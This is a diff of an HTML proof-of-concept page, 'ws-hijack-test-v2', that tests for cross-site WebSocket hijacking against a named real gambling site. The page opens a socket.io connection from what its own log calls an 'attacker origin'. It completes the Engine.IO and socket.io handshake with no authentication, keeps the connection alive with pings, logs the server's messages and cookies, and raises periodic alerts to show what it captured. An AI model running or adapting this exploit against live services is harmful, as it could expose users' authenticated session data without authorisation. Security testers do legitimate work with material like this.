@@ -2,28 +2,60 @@
 <html>
 <head><title>ws-hijack-test</title></head>
 <body>
-<h1>ws-hijack-test</h1>
+<h1>ws-hijack-test-v2</h1>
 <script>
 (function() {
   var out = document.createElement('pre');
-  out.style.fontSize = '18px';
+  out.style.fontSize = '16px';
+  out.style.whiteSpace = 'pre-wrap';
   document.body.appendChild(out);
-  function log(s) { out.textContent += s + "\n"; alert(s); }
+  function log(s) { out.textContent += s + "\n"; }
 
   log("origin: " + window.location.href);
   log("cookies visible to this page: " + document.cookie);
 
   try {
     var ws = new WebSocket("wss://1win.com/v4/socket.io/?isMobileApp=true&xorigin=1win.com&app=frontend&Language=en&EIO=4&transport=websocket");
+    var msgCount = 0;
+    var log20 = [];
+
     ws.onopen = function() { log("WS OPEN to 1win.com from attacker origin"); };
+
     ws.onmessage = function(e) {
       var d = String(e.data);
-      log("WS MSG (" + d.length + " bytes): " + d.substring(0, 500));
+      msgCount++;
+      // Engine.IO packet type is the first character after any binary/ack prefix handling.
+      var type = d.charAt(0);
+      if (type === '0') {
+        // engine.io OPEN -> immediately send socket.io CONNECT packet ("40")
+        log("[recv 0] engine.io open: " + d.substring(0,150));
+        ws.send("40");
+        log("[sent] 40 (socket.io connect, no auth payload)");
+      } else if (type === '2') {
+        // engine.io PING -> must PONG or server will close us
+        ws.send("3");
+        log("[recv 2] ping -> sent 3 (pong)");
+      } else if (type === '4') {
+        // engine.io MESSAGE wrapping a socket.io packet
+        log("[recv 4] socket.io message #" + msgCount + " (" + d.length + " bytes): " + d.substring(0, 400));
+      } else {
+        log("[recv " + type + "] msg #" + msgCount + " (" + d.length + " bytes): " + d.substring(0, 400));
+      }
+      log20.push(d);
     };
     ws.onerror = function(e) { log("WS ERROR"); };
-    ws.onclose = function(e) { log("WS CLOSED code=" + e.code + " reason=" + e.reason); };
+    ws.onclose = function(e) { log("WS CLOSED code=" + e.code + " reason=" + e.reason + " total_msgs=" + msgCount); };
+
+    // Report final buffered log via alert every 5s so we can read it without needing devtools.
+    var rounds = 0;
+    var interval = setInterval(function() {
+      rounds++;
+      alert("STATUS @" + (rounds*5) + "s:\n" + out.textContent.slice(-1200));
+      if (rounds >= 6) clearInterval(interval);
+    }, 5000);
   } catch (e) {
     log("WS EXCEPTION: " + e);
+    alert("WS EXCEPTION: " + e);
   }
 })();
 </script>
